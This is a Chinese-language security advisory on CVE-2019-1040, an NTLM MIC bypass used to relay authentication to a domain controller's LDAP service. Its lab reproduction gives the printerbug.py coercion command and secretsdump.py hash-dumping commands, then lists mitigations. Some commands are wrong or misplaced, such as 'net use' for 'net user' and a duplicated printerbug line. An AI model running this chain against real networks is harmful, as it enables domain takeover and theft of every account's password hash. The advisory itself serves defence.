# 【漏洞预警】NTLM认证防护绕过实现中继攻击获取域控权限（CVE-2019-1040）

一前言

近日，微软在安全通告中，发布了一个对NTLM认证过程进行篡改的漏洞修复补丁，CVE编号为CVE-2019-1040，该漏洞允许攻击者在掌握域普通用户的权限下，绕过NTLM消息完整性校验，从而实施NTLM中继攻击，当结合其它问题和特性时，甚至可以实现提权，并最终拿下域管最高权限。

国外安全研究员dirkjanm通过博客文章详细了该漏洞的影响和利用过程，并公布了两种在现实场景中存在的利用方式，经斗象能力中心团队验证，该漏洞在内网环境下可被成功利用，攻击利用成本和难度较低，建议相关用户在第一时间对该漏洞进行排查确认和修复。

二影响范围

Windows 7 ~ Windows 10

Windows 2008 ~ Windows 2019

另外，Windows 7和Windows 2008 以下的操作系统由于已经停止维护，未被微软官方列入受影响范围列表中，但这些停止维护的操作系统理论上同样受该漏洞影响。

三漏洞危害

攻击者通过已掌握的域普通用户权限和NTLM中继，可以在一定条件下提权并最终拿下域最高权限。

四漏洞利用条件

攻击者掌握域普通用户权限，同时，该漏洞利用是通过NTLM中继的方式进行，因此攻击者需要已经在内网环境中取得可用主机。

五漏洞简介

NTLM中继攻击经过多年的发展和攻防对抗，在协议设计和认证交互过程中已经有越来越多的安全特性作为保障。在 NTLM-on-SMB 中，NTLMSSP\_NEGOTIATE\_SIGN标志设置使得SMB通信受消息签名的保护。同时，消息完整性校验码（MIC）确保NTLM交互过程（NEGOTIATE/CHALLENGE/AUTHENTICATE）未受篡改，而 MIC 又受 NTLMv2 Response 中 MsvAvFlags 标志位的控制，当 MsvAvFlags=0x0002 时，客户端必须携带MIC，NTLMv2 Response 受账户密码的签名保护，这一连串的依赖关系和校验机制使得攻击者无法简单的通过移除MIC来禁用SMB通信的签名保护，这就意味着来自SMB的NTLM认证很难被中继重放。

本次漏洞根源正是出在NTLM认证交互过程中，服务端对MIC的校验出现问题。攻击者组合特定Flag设置和移除MIC，可以成功禁用SMB签名保护，从而实现将SMB上的NTLM认证中继重放到其它协议中，如安全研究员dirkjanm已公开的中继到LDAP协议。

那么，只要能中继高权限的NTLM凭证到LDAP，就可以修改活动目录数据库，授予特定用户高权限（如获取DCSync权限使得用户具备dump账户哈希的权限）。

现在问题只剩如何能获取高权限的NTLM认证然后实施中继重放，而这可以利用其它已知问题——通过高权限主机的打印服务Spooler出现的一个问题触发该主机利用自身的高权限账户向攻击机发起SMB上的NTLM认证，结合这两点可以实现高权限账户的NTLM中继攻击从而拿下域最高权限。

六漏洞复现

以下复现通过将Exchange服务器的高权限NTLM认证中继到DC的LDAP服务上，为普通域用户授予DCSync权限，并转储所有域用户的密码哈希。  

*   测试域：fb.com，Windows Server 2012 R2
    
*   域控：10.0.83.93，masterdc.fb.com
    
*   Exchange服务器：10.0.83.94，test2k12.fb.com
    
*   创建域普通账户：badman
    
*   攻击机：Kali，10.0.83.11
    

  

创建一个测试账户，为域内的普通权限账户，badman：

net use badman PASSWORD /add

测试利用该账户连接域控的LDAP服务，转储域内用户的密码哈希：  

secretsdump.py fb.com/badman@masterdc.fb.com -just-dc

![](../Images/acffceb07404815ad50ae994daea128a.png)  

提示无权限操作，因为该用户是普通账户。

启动NTLM中继攻击，将在445端口进行监听：

python printerbug.py fb.com/badman@test2k12.fb.com 10.0.83.11

![](../Images/90685eef107a5cb9ce9f81a10039c9ae.png)  

利用dirkjanm提供的printerbug.py脚本，可以触发Exchange服务器Spooler服务向攻击机Kali发起SMB上的NTLM认证，该认证使用的是Exchange服务的高权限账户发起：

python printerbug.py fb.com/badman@test2k12.fb.com 10.0.83.11

![](../Images/e36c8fc6fd614b022ffe97156a88f32c.png)  

此时监听的ntlmrelayx在445端口上已经收到NTLM认证请求，通过中继该认证过程，取得访问域控LDAP，并成功授予badman用户Replication-Get-Changes-All权限：

![](../Images/af146c806fba22a5af5acecd2d013af3.png)

再次利用bandman账户连接域控的LDAP服务，转储域内用户的密码哈希，成功：

secretsdump.py fb.com/badman@masterdc.fb.com -just-dc

![](../Images/e3195ea11f3b9396ea4c154d9db85217.png)  

七修复方案

微软官方已经发布对该漏洞的修复补丁，请下载相应操作系统更新补丁，安装更新。尤其针对涉及重要数据和高权限的服务器，建议尽快安装补丁。

对于无法安装补丁的服务器，可通过以下方式缓解漏洞可能带来的影响，请适当评估以下方式，以免对正常业务和服务稳定性造成额外影响：

*   降低高权限服务器的账户权限，如Exchange服务器；
    
*   强制开启LDAP通信签名校验（LDAP Signing）和LDAP通道绑定（LDAP channel binding）；
    
*   强制开启SMB通信签名校验（SMB Signing），默认情况下只有域控开启了该选项；
    
*   禁用高权限服务器的Spooler服务，防止上述提及的该服务bug问题被利用于触发NTLM-on-SMB认证发起；
